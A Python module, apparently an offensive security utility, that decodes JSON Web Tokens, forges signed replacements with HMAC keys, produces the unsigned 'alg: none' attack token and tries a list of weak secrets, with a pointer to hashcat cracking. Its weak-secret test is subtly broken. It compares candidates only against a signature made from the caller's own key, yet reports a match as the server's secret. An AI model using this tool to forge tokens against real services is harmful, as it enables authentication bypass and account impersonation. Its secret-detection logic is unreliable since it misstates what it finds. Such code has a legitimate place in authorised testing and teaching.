"""JWT decode and forge: inspect tokens and produce signed replacements.

Standard base64url JOSE encoding, HS256/384/512 via hmac, the classic ``alg: none``
attack, and a weak-secret candidate test for forged-signature matching.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _sign(algorithm: str, signing_input: bytes, key: bytes) -> bytes:
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[algorithm]
    return hmac.new(key, signing_input, digest).digest()


def jwt_decode(token: str) -> dict[str, Any]:
    """Split a JWT and decode header and payload; the signature stays raw."""
    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()
    parts = token.split(".")
    if len(parts) != 3:
        return {"error": f"a JWT has 3 dot-separated parts, got {len(parts)}"}
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception as exc:
        return {"error": f"not decodable as JWT: {exc}"}
    try:
        signature = _b64url_decode(parts[2])
        signature_hex: str | None = signature.hex()
    except Exception:
        # A garbage signature segment is itself information - report it raw.
        signature_hex = None
    return {
        "header": header,
        "payload": payload,
        "signature_hex": signature_hex,
        "signature_b64": parts[2],
        "signature_valid_b64": signature_hex is not None,
        "alg": header.get("alg"),
        "claims": sorted(payload.keys()),
        "note": "decode only; forge with jwt_forge once you know what to change",
    }


def jwt_forge(
    claims: dict[str, Any],
    algorithm: str = "HS256",
    key: str = "",
    secret_candidates: list[str] | None = None,
) -> dict[str, Any]:
    """Build a signed JWT from claims, or test weak secrets against known claims.

    ``claims`` should look like ``{"header": {...}, "payload": {...}}``; a flat dict is
    accepted and used as the payload with the default header. ``algorithm=none`` produces
    the empty-signature token that unverified servers accept. ``secret_candidates``:
    when one of them reproduces a signature for the same claims, that is the server's
    HMAC secret - the response says so.
    """
    algorithm = algorithm.upper()
    if algorithm not in ("HS256", "HS384", "HS512", "NONE"):
        return {"error": "algorithm must be HS256, HS384, HS512, or none"}

    if "payload" in claims and isinstance(claims.get("header"), dict):
        header = dict(claims["header"])
        payload = claims["payload"]
    else:
        header = {"alg": algorithm, "typ": "JWT"}
        payload = claims
    header["alg"] = "none" if algorithm == "NONE" else algorithm

    signing_input = f"{_b64url_encode(json.dumps(header, separators=(',', ':')).encode())}.{_b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"

    if algorithm == "NONE":
        return {
            "token": f"{signing_input}.",
            "algorithm": "none",
            "note": "empty signature: servers that skip verification accept this; hardened ones reject alg=none outright",
        }

    if not key:
        return {"error": "HS* algorithms need a key (pass key='...')"}

    signature = _sign(algorithm, signing_input.encode(), key.encode())
    token = f"{signing_input}.{_b64url_encode(signature)}"

    result: dict[str, Any] = {"token": token, "algorithm": algorithm, "key_used": key}
    if secret_candidates:
        for candidate in secret_candidates:
            candidate_signature = _sign(algorithm, signing_input.encode(), candidate.encode())
            if candidate_signature == signature:
                result["weak_secret_found"] = candidate
                result["note"] = "this candidate reproduces the signature: it IS the server's secret"
                break
        else:
            result["note"] = "none of the candidates matched; extend the list or hashcat mode 16500 the token"
    return result
